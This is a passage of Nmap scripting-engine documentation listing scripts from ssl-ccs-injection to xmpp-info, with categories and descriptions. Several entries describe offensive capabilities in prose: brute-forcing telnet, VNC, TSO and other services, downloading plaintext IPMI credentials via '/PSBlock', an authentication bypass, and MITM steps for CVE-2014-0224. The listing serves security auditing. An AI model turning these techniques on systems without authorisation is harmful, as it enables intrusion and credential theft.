  vulnerability (CVE-2014-0224), first discovered by Masashi Kikuchi.
  The script is based on the ccsinjection.c code authored by Ramon de C Valle
  (https://gist.github.com/rcvalle/71f4b027d61a78c42607)

  In order to exploit the vulnerablity, a MITM attacker would effectively
  do the following:

      o Wait for a new TLS connection, followed by the ClientHello
        ServerHello handshake messages.

      o Issue a CCS packet in both the directions, which causes the OpenSSL
        code to use a zero length pre master secret key. The packet is sent
        to both ends of the connection. Session Keys are derived using a
        zero length pre master secret key, and future session keys also
        share this weakness.

      o Renegotiate the handshake parameters.

      o The attacker is now able to decrypt or even modify the packets
        in transit.

  The script works by sending a 'ChangeCipherSpec' message out of order and
  checking whether the server returns an 'UNEXPECTED_MESSAGE' alert record
  or not. Since a non-patched server would simply accept this message, the
  CCS packet is sent twice, in order to force an alert from the server. If
  the alert type is different than 'UNEXPECTED_MESSAGE', we can conclude
  the server is vulnerable.

ssl-cert-intaddr
Categories: vuln discovery safe
https://nmap.org/nsedoc/scripts/ssl-cert-intaddr.html
  Reports any private (RFC1918) IPv4 addresses found in the various fields of
  an SSL service's certificate.  These will only be reported if the target
  address itself is not private.  Nmap v7.30 or later is required.

ssl-cert
Categories: default safe discovery
https://nmap.org/nsedoc/scripts/ssl-cert.html
  Retrieves a server's SSL certificate. The amount of information printed
  about the certificate depends on the verbosity level. With no extra
  verbosity, the script prints the validity period and the commonName,
  organizationName, stateOrProvinceName, and countryName of the subject.

  <code>
  443/tcp open  https
  | ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\
  /stateOrProvinceName=California/countryName=US
  | Not valid before: 2011-03-23 00:00:00
  |_Not valid after:  2013-04-01 23:59:59
  </code>

  With <code>-v</code> it adds the issuer name and fingerprints.

  <code>
  443/tcp open  https
  | ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\
  /stateOrProvinceName=California/countryName=US
  | Issuer: commonName=VeriSign Class 3 Extended Validation SSL CA\
  /organizationName=VeriSign, Inc./countryName=US
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha1WithRSAEncryption
  | Not valid before: 2011-03-23 00:00:00
  | Not valid after:  2013-04-01 23:59:59
  | MD5:   bf47 ceca d861 efa7 7d14 88ad 4a73 cb5b
  |_SHA-1: d846 5221 467a 0d15 3df0 9f2e af6d 4390 0213 9a68
  </code>

  With <code>-vv</code> it adds the PEM-encoded contents of the entire
  certificate.

  <code>
  443/tcp open  https
  | ssl-cert: Subject: commonName=www.paypal.com/organizationName=PayPal, Inc.\
  /stateOrProvinceName=California/countryName=US/1.3.6.1.4.1.311.60.2.1.2=Delaware\
  /postalCode=95131-2021/localityName=San Jose/serialNumber=3014267\
  /streetAddress=2211 N 1st St/1.3.6.1.4.1.311.60.2.1.3=US\
  /organizationalUnitName=PayPal Production/businessCategory=Private Organization
  | Issuer: commonName=VeriSign Class 3 Extended Validation SSL CA\
  /organizationName=VeriSign, Inc./countryName=US\
  /organizationalUnitName=Terms of use at https://www.verisign.com/rpa (c)06
  | Public Key type: rsa
  | Public Key bits: 2048
  | Signature Algorithm: sha1WithRSAEncryption
  | Not valid before: 2011-03-23 00:00:00
  | Not valid after:  2013-04-01 23:59:59
  | MD5:   bf47 ceca d861 efa7 7d14 88ad 4a73 cb5b
  | SHA-1: d846 5221 467a 0d15 3df0 9f2e af6d 4390 0213 9a68
  | -----BEGIN CERTIFICATE-----
  | MIIGSzCCBTOgAwIBAgIQLjOHT2/i1B7T//819qTJGDANBgkqhkiG9w0BAQUFADCB
  ...
  | 9YDR12XLZeQjO1uiunCsJkDIf9/5Mqpu57pw8v1QNA==
  |_-----END CERTIFICATE-----
  </code>

ssl-date
Categories: discovery safe default
https://nmap.org/nsedoc/scripts/ssl-date.html
  Retrieves a target host's time and date from its TLS ServerHello response.


  In many TLS implementations, the first four bytes of server randomness
  are a Unix timestamp. The script will test whether this is indeed true
  and report the time only if it passes this test.

  Original idea by Jacob Appelbaum and his TeaTime and tlsdate tools:
  * https://github.com/ioerror/TeaTime
  * https://github.com/ioerror/tlsdate

ssl-dh-params
Categories: vuln safe
https://nmap.org/nsedoc/scripts/ssl-dh-params.html
  Weak ephemeral Diffie-Hellman parameter detection for SSL/TLS services.

  This script simulates SSL/TLS handshakes using ciphersuites that have ephemeral
  Diffie-Hellman as the key exchange algorithm.

  Diffie-Hellman MODP group parameters are extracted and analyzed for vulnerability
  to Logjam (CVE 2015-4000) and other weaknesses.

  Opportunistic STARTTLS sessions are established on services that support them.

ssl-enum-ciphers
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/ssl-enum-ciphers.html
  This script repeatedly initiates SSLv3/TLS connections, each time trying a new
  cipher or compressor while recording whether a host accepts or rejects it. The
  end result is a list of all the ciphersuites and compressors that a server accepts.

  Each ciphersuite is shown with a letter grade (A through F) indicating the
  strength of the connection. The grade is based on the cryptographic strength of
  the key exchange and of the stream cipher. The message integrity (hash)
  algorithm choice is not a factor.  The output line beginning with
  <code>Least strength</code> shows the strength of the weakest cipher offered.
  The scoring is based on the Qualys SSL Labs SSL Server Rating Guide, but does
  not take protocol support (TLS version) into account, which makes up 30% of the
  SSL Labs rating.

  SSLv3/TLSv1 requires more effort to determine which ciphers and compression
  methods a server supports than SSLv2. A client lists the ciphers and compressors
  that it is capable of supporting, and the server will respond with a single
  cipher and compressor chosen, or a rejection notice.

  Some servers use the client's ciphersuite ordering: they choose the first of
  the client's offered suites that they also support. Other servers prefer their
  own ordering: they choose their most preferred suite from among those the
  client offers. In the case of server ordering, the script makes extra probes to
  discover the server's sorted preference list. Otherwise, the list is sorted
  alphabetically.

  The script will warn about certain SSL misconfigurations such as MD5-signed
  certificates, low-quality ephemeral DH parameters, and the POODLE
  vulnerability.

  This script is intrusive since it must initiate many connections to a server,
  and therefore is quite noisy.

  It is recommended to use this script in conjunction with version detection
  (<code>-sV</code>) in order to discover SSL/TLS services running on unexpected
  ports. For the most common SSL ports like 443, 25 (with STARTTLS), 3389, etc.
  the script is smart enough to run on its own.

  References:
  * Qualys SSL Labs Rating Guide - https://www.ssllabs.com/projects/rating-guide/

ssl-heartbleed
Categories: vuln safe
https://nmap.org/nsedoc/scripts/ssl-heartbleed.html
  Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
  The code is based on the Python script ssltest.py authored by Katie Stafford (katie@ktpanda.org)

ssl-known-key
Categories: safe discovery vuln default
https://nmap.org/nsedoc/scripts/ssl-known-key.html
  Checks whether the SSL certificate used by a host has a fingerprint
  that matches an included database of problematic keys.

  The only databases currently checked are the LittleBlackBox 0.1 database of
  compromised keys from various devices, some keys reportedly used by the Chinese
  state-sponsored hacking division APT1
  (https://www.fireeye.com/blog/threat-research/2013/03/md5-sha1.html),
  and the key used by CARBANAK malware
  (https://www.fireeye.com/blog/threat-research/2017/06/behind-the-carbanak-backdoor.html).
  However, any file of fingerprints will serve just as well. For example, this
  could be used to find weak Debian OpenSSL keys using the widely available (but
  too large to include with Nmap) list.

ssl-poodle
Categories: vuln safe
https://nmap.org/nsedoc/scripts/ssl-poodle.html
  Checks whether SSLv3 CBC ciphers are allowed (POODLE)

  Run with -sV to use Nmap's service scan to detect SSL/TLS on non-standard
  ports. Otherwise, ssl-poodle will only run on ports that are commonly used for
  SSL.

  POODLE is CVE-2014-3566. All implementations of SSLv3 that accept CBC
  ciphersuites are vulnerable. For speed of detection, this script will stop
  after the first CBC ciphersuite is discovered. If you want to enumerate all CBC
  ciphersuites, you can use Nmap's own ssl-enum-ciphers to do a full audit of
  your TLS ciphersuites.

sslv2-drown
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/sslv2-drown.html
  Determines whether the server supports SSLv2, what ciphers it supports and tests for
  CVE-2015-3197, CVE-2016-0703 and CVE-2016-0800 (DROWN)

sslv2
Categories: default safe
https://nmap.org/nsedoc/scripts/sslv2.html
  Determines whether the server supports obsolete and less secure SSLv2, and discovers which ciphers it
  supports.

sstp-discover
Categories: discovery default safe
https://nmap.org/nsedoc/scripts/sstp-discover.html
  Check if the Secure Socket Tunneling Protocol is supported. This is
  accomplished by trying to establish the HTTPS layer which is used to
  carry SSTP traffic as described in:
      - http://msdn.microsoft.com/en-us/library/cc247364.aspx

  Current SSTP server implementations:
      - Microsoft Windows (Server 2008/Server 2012)
      - MikroTik RouterOS
      - SEIL (http://www.seil.jp)

stun-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/stun-info.html
  Retrieves the external IP address of a NAT:ed host using the STUN protocol.

stun-version
Categories: version
https://nmap.org/nsedoc/scripts/stun-version.html
  Sends a binding request to the server and attempts to extract version
  information from the response, if the server attribute is present.

stuxnet-detect
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/stuxnet-detect.html
  Detects whether a host is infected with the Stuxnet worm (http://en.wikipedia.org/wiki/Stuxnet).

  An executable version of the Stuxnet infection will be downloaded if a format
  for the filename is given on the command line.

supermicro-ipmi-conf
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/supermicro-ipmi-conf.html
  Attempts to download an unprotected configuration file containing plain-text
  user credentials in vulnerable Supermicro Onboard IPMI controllers.

  The script connects to port 49152 and issues a request for "/PSBlock" to
  download the file. This configuration file contains users with their passwords
  in plain text.

  References:
  * http://blog.cari.net/carisirt-yet-another-bmc-vulnerability-and-some-added-extras/
  * https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi

svn-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/svn-brute.html
  Performs brute force password auditing against Subversion source code control servers.

targets-asn
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/targets-asn.html
  Produces a list of IP prefixes for a given routing AS number (ASN).

  This script uses a whois server database operated by the Shadowserver
  Foundation.  We thank them for granting us permission to use this in
  Nmap.

  Output is in CIDR notation.

  http://www.shadowserver.org/wiki/pmwiki.php/Services/IP-BGP

targets-ipv6-map4to6
Categories: discovery
https://nmap.org/nsedoc/scripts/targets-ipv6-map4to6.html
  This script runs in the pre-scanning phase to map IPv4 addresses onto IPv6
  networks and add them to the scan queue.

  The technique is more general than what is technically termed "IPv4-mapped IPv6
  addresses." The lower 4 bytes of the IPv6 network address are replaced with the
  4 bytes of IPv4 address. When the IPv6 network is ::ffff:0:0/96, then the
  script generates IPv4-mapped IPv6 addresses. When the network is ::/96, then it
  generates IPv4-compatible IPv6 addresses.

targets-ipv6-multicast-echo
Categories: discovery broadcast
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-echo.html
  Sends an ICMPv6 echo request packet to the all-nodes link-local
  multicast address (<code>ff02::1</code>) to discover responsive hosts
  on a LAN without needing to individually ping each IPv6 address.

targets-ipv6-multicast-invalid-dst
Categories: discovery broadcast
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-invalid-dst.html
  Sends an ICMPv6 packet with an invalid extension header to the
  all-nodes link-local multicast address (<code>ff02::1</code>) to
  discover (some) available hosts on the LAN. This works because some
  hosts will respond to this probe with an ICMPv6 Parameter Problem
  packet.

targets-ipv6-multicast-mld
Categories: discovery broadcast
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-mld.html
  Attempts to discover available IPv6 hosts on the LAN by sending an MLD
  (multicast listener discovery) query to the link-local multicast address
  (ff02::1) and listening for any responses.  The query's maximum response delay
  set to 1 to provoke hosts to respond immediately rather than waiting for other
  responses from their multicast group.

targets-ipv6-multicast-slaac
Categories: discovery broadcast
https://nmap.org/nsedoc/scripts/targets-ipv6-multicast-slaac.html
  Performs IPv6 host discovery by triggering stateless address auto-configuration
  (SLAAC).

  This script works by sending an ICMPv6 Router Advertisement with a random
  address prefix, which causes hosts to begin SLAAC and send a solicitation for
  their newly configured address, as part of duplicate address detection. The
  script then guesses the remote addresses by combining the link-local prefix of
  the interface with the interface identifier in each of the received
  solicitations. This should be followed up with ordinary ND host discovery to
  verify that the guessed addresses are correct.

  The router advertisement has a router lifetime of zero and a short prefix
  lifetime (a few seconds)

  See also:
  * RFC 4862, IPv6 Stateless Address Autoconfiguration, especially section 5.5.3.
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement.rb

targets-ipv6-wordlist
Categories: discovery
https://nmap.org/nsedoc/scripts/targets-ipv6-wordlist.html
  Adds IPv6 addresses to the scan queue using a wordlist of hexadecimal "words"
  that form addresses in a given subnet.

targets-sniffer
Categories: broadcast discovery safe
https://nmap.org/nsedoc/scripts/targets-sniffer.html
  Sniffs the local network for a configurable amount of time (10 seconds
  by default) and prints discovered addresses. If the
  <code>newtargets</code> script argument is set, discovered addresses
  are added to the scan queue.

  Requires root privileges. Either the <code>targets-sniffer.iface</code> script
  argument or <code>-e</code> Nmap option to define which interface to use.

targets-traceroute
Categories: safe discovery
https://nmap.org/nsedoc/scripts/targets-traceroute.html
  Inserts traceroute hops into the Nmap scanning queue. It only functions if
  Nmap's <code>--traceroute</code> option is used and the <code>newtargets</code>
  script argument is given.

targets-xml
Categories: safe
https://nmap.org/nsedoc/scripts/targets-xml.html
  Loads addresses from an Nmap XML output file for scanning.

  Address type (IPv4 or IPv6) is determined according to whether -6 is specified to nmap.

teamspeak2-version
Categories: version
https://nmap.org/nsedoc/scripts/teamspeak2-version.html
  Detects the TeamSpeak 2 voice communication server and attempts to determine
  version and configuration information.

  A single UDP packet (a login request) is sent. If the server does not have a
  password set, the exact version, name, and OS type will also be reported on.

telnet-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/telnet-brute.html
  Performs brute-force password auditing against telnet servers.

telnet-encryption
Categories: safe discovery
https://nmap.org/nsedoc/scripts/telnet-encryption.html
  Determines whether the encryption option is supported on a remote telnet
  server.  Some systems (including FreeBSD and the krb5 telnetd available in many
  Linux distributions) implement this option incorrectly, leading to a remote
  root vulnerability. This script currently only tests whether encryption is
  supported, not for that particular vulnerability.

  References:
  * FreeBSD Advisory: http://lists.freebsd.org/pipermail/freebsd-announce/2011-December/001398.html
  * FreeBSD Exploit: http://www.exploit-db.com/exploits/18280/
  * RedHat Enterprise Linux Advisory: https://rhn.redhat.com/errata/RHSA-2011-1854.html

telnet-ntlm-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/telnet-ntlm-info.html
  This script enumerates information from remote Microsoft Telnet services with NTLM
  authentication enabled.

  Sending a MS-TNAP NTLM authentication request with null credentials will cause the
  remote service to respond with a NTLMSSP message disclosing information to include
  NetBIOS, DNS, and OS build version.

tftp-enum
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/tftp-enum.html
  Enumerates TFTP (trivial file transfer protocol) filenames by testing
  for a list of common ones.

  TFTP doesn't provide directory listings. This script tries to retrieve
  filenames from a list. The list is composed of static names from the
  file <code>tftplist.txt</code>, plus configuration filenames for Cisco
  devices that change based on the target address, of the form
  <code>A.B.C.X-confg</code> for an IP address A.B.C.D and for X in 0 to
  255.

  Use the <code>tftp-enum.filelist</code> script argument to search for
  other static filenames.

  This script is a reimplementation of tftptheft from
  http://code.google.com/p/tftptheft/.

tls-alpn
Categories: discovery safe default
https://nmap.org/nsedoc/scripts/tls-alpn.html
  Enumerates a TLS server's supported application-layer protocols using the ALPN protocol.

  Repeated queries are sent to determine which of the registered protocols are supported.

  For more information, see:
  * https://tools.ietf.org/html/rfc7301

tls-nextprotoneg
Categories: discovery safe default
https://nmap.org/nsedoc/scripts/tls-nextprotoneg.html
  Enumerates a TLS server's supported protocols by using the next protocol
  negotiation extension.

  This works by adding the next protocol negotiation extension in the client
  hello packet and parsing the returned server hello's NPN extension data.

  For more information, see:
  * https://tools.ietf.org/html/draft-agl-tls-nextprotoneg-03

tls-ticketbleed
Categories: vuln safe
https://nmap.org/nsedoc/scripts/tls-ticketbleed.html
  Detects whether a server is vulnerable to the F5 Ticketbleed bug (CVE-2016-9244).

  For additional information:
  * https://filippo.io/Ticketbleed/
  * https://blog.filippo.io/finding-ticketbleed/
  * https://support.f5.com/csp/article/K05121675

tn3270-screen
Categories: safe discovery
https://nmap.org/nsedoc/scripts/tn3270-screen.html
  Connects to a tn3270 'server' and returns the screen.

  Hidden fields will be listed below the screen with (row, col) coordinates.

tor-consensus-checker
Categories: external safe
https://nmap.org/nsedoc/scripts/tor-consensus-checker.html
  Checks if a target is a known Tor node.

  The script works by querying the Tor directory authorities. Initially,
  the script stores all IPs of Tor nodes in a lookup table to reduce the
  number of requests and make lookups quicker.

traceroute-geolocation
Categories: safe external discovery
https://nmap.org/nsedoc/scripts/traceroute-geolocation.html
  Lists the geographic locations of each hop in a traceroute and optionally
  saves the results to a KML file, plottable on Google earth and maps.

tso-brute
Categories: intrusive
https://nmap.org/nsedoc/scripts/tso-brute.html
  TSO account brute forcer.

  This script relies on the NSE TN3270 library which emulates a
  TN3270 screen for NMAP.

  TSO user IDs have the following rules:
   - it cannot begin with a number
   - only contains alpha-numeric characters and @, #, $.
   - it cannot be longer than 7 chars

tso-enum
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/tso-enum.html
  TSO User ID enumerator for IBM mainframes (z/OS). The TSO logon panel
  tells you when a user ID is valid or invalid with the message:
   <code>IKJ56420I Userid <user ID> not authorized to use TSO</code>.

  The TSO logon process can work in two ways:
  1) You get prompted with <code>IKJ56700A ENTER USERID -</code>
     to which you reply with the user you want to use.
     If the user ID is valid it will give you a normal
     TSO logon screen. Otherwise it will give you the
     screen logon error above.
  2) You're given the TSO logon panel and enter your user ID
     at the <code>Userid    ===></code> prompt. If you give
     it an invalid user ID you receive the error message above.

  This script relies on the NSE TN3270 library which emulates a
  TN3270 screen for NMAP.

  TSO user IDs have the following rules:
   - it cannot begin with a number
   - only contains alpha-numeric characters and @, #, $.
   - it cannot be longer than 7 chars

ubiquiti-discovery
Categories: default discovery version safe
https://nmap.org/nsedoc/scripts/ubiquiti-discovery.html
  Extracts information from Ubiquiti networking devices.

  This script leverages Ubiquiti's Discovery Service which is enabled by default
  on many products. It will attempt to leverage version 1 of the protocol first
  and, if that fails, attempt version 2.

unittest
Categories: safe
https://nmap.org/nsedoc/scripts/unittest.html
  Runs unit tests on all NSE libraries.

unusual-port
Categories: safe
https://nmap.org/nsedoc/scripts/unusual-port.html
  Compares the detected service on a port against the expected service for that
  port number (e.g. ssh on 22, http on 80) and reports deviations. The script
  requires that a version scan has been run in order to be able to discover what
  service is actually running on each port.

upnp-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/upnp-info.html
  Attempts to extract system information from the UPnP service.

uptime-agent-info
Categories: safe default
https://nmap.org/nsedoc/scripts/uptime-agent-info.html
  Gets system information from an Idera Uptime Infrastructure Monitor agent.

url-snarf
Categories: safe
https://nmap.org/nsedoc/scripts/url-snarf.html
  Sniffs an interface for HTTP traffic and dumps any URLs, and their
  originating IP address. Script output differs from other script as
  URLs are written to stdout directly. There is also an option to log
  the results to file.

  The script can be limited in time by using the timeout argument or run until a
  ctrl+break is issued, by setting the timeout to 0.

ventrilo-info
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/ventrilo-info.html
  Detects the Ventrilo voice communication server service versions 2.1.2
  and above and tries to determine version and configuration
  information. Some of the older versions (pre 3.0.0) may not have the
  UDP service that this probe relies on enabled by default.

  The Ventrilo server listens on a TCP (voice/control) and an UDP (ping/status)
  port with the same port number (fixed to 3784 in the free version, otherwise
  configurable). This script activates on both a TCP and UDP port version scan.
  In both cases probe data is sent only to the UDP port because it allows for a
  simple and informative status command as implemented by the
  <code>ventrilo_status.exe</code> executable which has shipped alongside the Windows server
  package since version 2.1.2 when the UDP status service was implemented.

  When run as a version detection script (<code>-sV</code>), the script will report on the
  server version, name, uptime, authentication scheme, and OS.  When run
  explicitly (<code>--script ventrilo-info</code>), the script will additionally report on the
  server name phonetic pronunciation string, the server comment, maximum number
  of clients, voice codec, voice format, channel and client counts, and details
  about channels and currently connected clients.

  Original reversing of the protocol was done by Luigi Auriemma
  (http://aluigi.altervista.org/papers.htm#ventrilo).

versant-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/versant-info.html
  Extracts information, including file paths, version and database names from
  a Versant object database.

vmauthd-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/vmauthd-brute.html
  Performs brute force password auditing against the VMWare Authentication Daemon (vmware-authd).

vmware-version
Categories: discovery safe version
https://nmap.org/nsedoc/scripts/vmware-version.html
  Queries VMware server (vCenter, ESX, ESXi) SOAP API to extract the version information.

  The same script as VMware Fingerprinter from VASTO created by Claudio Criscione, Paolo Canaletti

vnc-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/vnc-brute.html
  Performs brute force password auditing against VNC servers.

vnc-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/vnc-info.html
  Queries a VNC server for its protocol version and supported security types.

vnc-title
Categories: intrusive discovery
https://nmap.org/nsedoc/scripts/vnc-title.html
  Tries to log into a VNC server and get its desktop name. Uses credentials
  discovered by vnc-brute, or None authentication types. If
  <code>realvnc-auth-bypass</code> was run and returned VULNERABLE, this script
  will use that vulnerability to bypass authentication.

voldemort-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/voldemort-info.html
  Retrieves cluster and store information from the Voldemort distributed key-value store using the Voldemort Native Protocol.

vtam-enum
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/vtam-enum.html
  Many mainframes use VTAM screens to connect to various applications
  (CICS, IMS, TSO, and many more).

  This script attempts to brute force those VTAM application IDs.

  This script is based on mainframe_brute by Dominic White
  (https://github.com/sensepost/mainframe_brute). However, this script
  doesn't rely on any third party libraries or tools and instead uses
  the NSE TN3270 library which emulates a TN3270 screen in lua.

  Application IDs only allows for 8 byte IDs, that is the only specific rule
  found for application IDs.

vulners
Categories: vuln safe external
https://nmap.org/nsedoc/scripts/vulners.html
  For each available CPE the script prints out known vulns (links to the correspondent info) and correspondent CVSS scores.

  Its work is pretty simple:
  * work only when some software version is identified for an open port
  * take all the known CPEs for that software (from the standard nmap -sV output)
  * make a request to a remote server (vulners.com API) to learn whether any known vulns exist for that CPE
  * if no info is found this way, try to get it using the software name alone
  * print the obtained info out

  NB:
  Since the size of the DB with all the vulns is more than 250GB there is no way to use a local db.
  So we do make requests to a remote service. Still all the requests contain just two fields - the
  software name and its version (or CPE), so one can still have the desired privacy.

vuze-dht-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/vuze-dht-info.html
  Retrieves some basic information, including protocol version from a Vuze filesharing node.

  As Vuze doesn't have a default port for its DHT service, this script has
  some difficulties in determining when to run. Most scripts are triggered by
  either a default port or a fingerprinted service. To get around this, there
  are two options:
  1. Always run a version scan, to identify the vuze-dht service in order to
     trigger the script.
  2. Force the script to run against each port by setting the argument
     vuze-dht-info.allports

wdb-version
Categories: default safe version discovery vuln
https://nmap.org/nsedoc/scripts/wdb-version.html
  Detects vulnerabilities and gathers information (such as version
  numbers and hardware support) from VxWorks Wind DeBug agents.

  Wind DeBug is a SunRPC-type service that is enabled by default on many devices
  that use the popular VxWorks real-time embedded operating system. H.D. Moore
  of Metasploit has identified several security vulnerabilities and design flaws
  with the service, including weakly-hashed passwords and raw memory dumping.

  See also:
  http://www.kb.cert.org/vuls/id/362332

weblogic-t3-info
Categories: default safe discovery version
https://nmap.org/nsedoc/scripts/weblogic-t3-info.html
  Detect the T3 RMI protocol and Weblogic version
whois-domain
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/whois-domain.html
  Attempts to retrieve information about the domain name of the target

whois-ip
Categories: discovery external safe
https://nmap.org/nsedoc/scripts/whois-ip.html
  Queries the WHOIS services of Regional Internet Registries (RIR) and attempts to retrieve information about the IP Address
  Assignment which contains the Target IP Address.

  The fields displayed contain information about the assignment and the organisation responsible for managing the address
  space. When output verbosity is requested on the Nmap command line (<code>-v</code>) extra information about the assignment will
  be displayed.

  To determine which of the RIRs to query for a given Target IP Address this script utilises Assignments Data hosted by IANA.
  The data is cached locally and then parsed for use as a lookup table.  The locally cached files are refreshed periodically
  to help ensure the data is current.  If, for any reason, these files are not available to the script then a default sequence
  of Whois services are queried in turn until: the desired record is found; or a referral to another (defined) Whois service is
  found; or until the sequence is exhausted without finding either a referral or the desired record.

  The script will recognize a referral to another Whois service if that service is defined in the script and will continue by
  sending a query to the referred service.  A record is assumed to be the desired one if it does not contain a referral.

  To reduce the number unnecessary queries sent to Whois services a record cache is employed and the entries in the cache can be
  applied to any targets within the range of addresses represented in the record.

  In certain circumstances, the ability to cache responses prevents the discovery of other, smaller IP address assignments
  applicable to the target because a cached response is accepted in preference to sending a Whois query.  When it is important
  to ensure that the most accurate information about the IP address assignment is retrieved the script argument <code>whodb</code>
  should be used with a value of <code>"nocache"</code> (see script arguments).  This reduces the range of addresses that may use a
  cached record to a size that helps ensure that smaller assignments will be discovered.  This option should be used with caution
  due to the potential to send large numbers of whois queries and possibly be banned from using the services.

  In using this script your IP address will be sent to iana.org. Additionally
  your address and the address of the target of the scan will be sent to one of
  the RIRs.

wsdd-discover
Categories: safe discovery default
https://nmap.org/nsedoc/scripts/wsdd-discover.html
  Retrieves and displays information from devices supporting the Web
  Services Dynamic Discovery (WS-Discovery) protocol. It also attempts
  to locate any published Windows Communication Framework (WCF) web
  services (.NET 4.0 or later).

x11-access
Categories: default safe auth
https://nmap.org/nsedoc/scripts/x11-access.html
  Checks if you're allowed to connect to the X server.

  If the X server is listening on TCP port 6000+n (where n is the display
  number), it is possible to check if you're able to get connected to the
  remote display by sending a X11 initial connection request.

  In reply, the success byte (0x00 or 0x01) will determine if you are in
  the <code>xhost +</code> list. In this case, script will display the message:
  <code>X server access is granted</code>.

xdmcp-discover
Categories: safe discovery
https://nmap.org/nsedoc/scripts/xdmcp-discover.html
  Requests an XDMCP (X display manager control protocol) session and lists supported authentication and authorization mechanisms.

xmlrpc-methods
Categories: default safe discovery
https://nmap.org/nsedoc/scripts/xmlrpc-methods.html
  Performs XMLRPC Introspection via the system.listMethods method.

  If the verbosity is > 1 then the script fetches the response
  of system.methodHelp for each method returned by listMethods.

xmpp-brute
Categories: brute intrusive
https://nmap.org/nsedoc/scripts/xmpp-brute.html
  Performs brute force password auditing against XMPP (Jabber) instant messaging servers.

xmpp-info
Categories: default safe discovery version
https://nmap.org/nsedoc/scripts/xmpp-info.html
  Connects to XMPP server (port 5222) and collects server information such as:
  supported auth mechanisms, compression methods, whether TLS is supported
  and mandatory, stream management, language, support of In-Band registration,
  server capabilities.  If possible, studies server vendor. """